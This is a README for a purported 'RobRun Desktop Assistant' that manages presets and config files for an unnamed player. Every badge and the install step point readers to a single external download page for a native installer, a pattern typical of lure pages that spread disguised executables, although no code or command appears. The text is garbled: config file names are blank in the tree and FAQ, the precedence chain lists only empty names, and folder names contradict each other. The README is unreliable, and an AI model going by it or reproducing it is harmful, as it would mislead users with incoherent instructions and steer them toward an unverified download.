# RobRun Desktop Assistant

<center>
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download-Release-65a30d?style=plastic&logo=apple&logoColor=white" alt="Download"></a>
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Windows-10%2C+11-0078D7?style=flat&logo=windows&logoColor=white" alt="Windows"></a>
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/MacOS-13-000000?style=for-the-badge&logo=apple&logoColor=white" alt="MacOS"></a>
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Python-3.9-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python"></a>
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Build-1.3.0-009688?style=flat&logo=buildkite&logoColor=white" alt="Build"></a>
</center>

---

## Overview
RobRun Desktop Assistant delivers a cohesive, desktop‑centric interface that centralizes configuration, workflow management, and performance tuning for the RobRun ecosystem. The assistant bundles structured configuration profiles, pre‑built workflow presets, and an up‑to‑date release package that can be installed directly through the provided download page. It is engineered to reduce manual editing, enforce consistency across environments, and expose advanced features through a friendly GUI.

---

## Workflow Presets
RobRun Desktop Assistant includes a library of ready‑to‑use workflow presets that map to common use cases:

| Preset | Target Scenario | Key Commands | Notes |
|--------|-----------------|--------------|-------|
| **QuickLaunch** | Launch the player with minimal latency. | `launch` | Skips analytics, uses `--fast` flag. |
| **FullSync** | Synchronize all assets and configurations across machines. | `sync --full` | Requires network connectivity and admin rights. |
| **DebugMode** | Enable verbose logging and diagnostic captures. | `debug --enable` | Only recommended for development teams. |
| **EnergySaver** | Reduce CPU usage while maintaining core functionality. | `optimize --cpu` | Adjusts thread count to 2 automatically. |

Each preset is defined in the `presets.json` file located in the assistant’s data directory. Users may duplicate, rename, or create new presets by extending this JSON structure. The assistant provides a quick‑select dropdown that reflects the current preset list and highlights the active preset in real time.

---

## Directory Tree
```
RobRun-Desktop-Assistant/
├── data/
│   ├── presets.json
│   ├── logs/
│   │   └── assistant.log
│   └── config/
│       ├──
│       ├──
│       ├──
│       └──
├── ui/
│   ├── main_window.py
│   └── widgets/
│       ├── config_editor.py
│       └── preset_manager.py
├── assets/
│   ├── icons/
│   └── themes/
├── installer/
│   └── Release
└── README.md
```

The tree above illustrates the separation of concerns: `data/` holds all runtime files, `ui/` contains the graphical modules, and `assets/` supplies visual resources. The `installer/` directory contains the native executable used by the Download button.

---

## Usage Guide
1. **Install**
   Click the Download button at the top of this page. The installer will place the assistant in `C:\Program Files\RobRun Assistant` (Windows) or `/Applications/RobRun Assistant.app` (macOS).
2. **Launch**
   Run `RobRun Assistant` from the Start menu or Spotlight. The main window appears with tabs for *Configuration*, *Presets*, and *Logs*.
3. **Select a Preset**
   In the *Presets* tab, choose from the dropdown list. The assistant updates the interface and applies the preset instantly.
4. **Edit Configuration**
   Navigate to the *Configuration* tab. Open any of the four cfg files. The editor provides syntax highlighting and a “Validate” button that checks for schema compliance.
5. **Apply Changes**
   After editing, click “Save & Apply”. The assistant restarts the player process if necessary and logs the action.

The assistant automatically refreshes its state every 30 seconds, ensuring that any external edits to the config files are reflected immediately.

---

## FAQ & Troubleshooting

**Q1: The assistant fails to load presets.**
A1: Verify that `presets.json` is present in `data/` and that it is a valid JSON file. If it was manually edited, run the “Validate” button in the Presets tab to locate errors.

**Q2: Log files are not generated.**
A2: Ensure that the `logs/` directory is writable. On Windows, run the assistant as Administrator. On macOS, check folder permissions in Finder.

**Q3: Configuration changes are ignored after restart.**
A3: The assistant follows a precedence order: `` → `` → `` → ``. If a key appears in more than one file, the last one in the chain overrides the earlier ones. Place your overrides in ``.

**Q4: The player process does not launch.**
A4: Confirm that the path in `` points to an existing executable. Use the “Locate Executable” button to browse. If the player requires additional environment variables, add them to the `flags` line.

**Q5: I want to add a new shortcut.**
A5: Open `` and add an entry such as `shortcut_newFeature=Ctrl+Shift+N`. Restart the assistant for the change to take effect.

**Q6: Performance is lower than expected.**
A6: Switch to the “EnergySaver” preset or adjust `threads` in ``. Monitor CPU usage via the “Logs” tab; the assistant logs thread allocation per launch.

**Q7: Why does the assistant refuse to update?**
A7: The update mechanism checks for a newer `Release` in the `installer/` directory. If you modified the installer, delete it and download the latest bundle again.

---

## Contributing
All contributions that enhance configuration clarity, add new workflow presets, or improve the UI are welcome. Please open an issue to discuss major changes before submitting a pull request. Adhere to the existing coding style in the `ui/` and `assets/` directories.

---

## License
RobRun Desktop Assistant is released under the MIT license. All source files and assets are included in the `LICENSE` document located in the repository root.

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```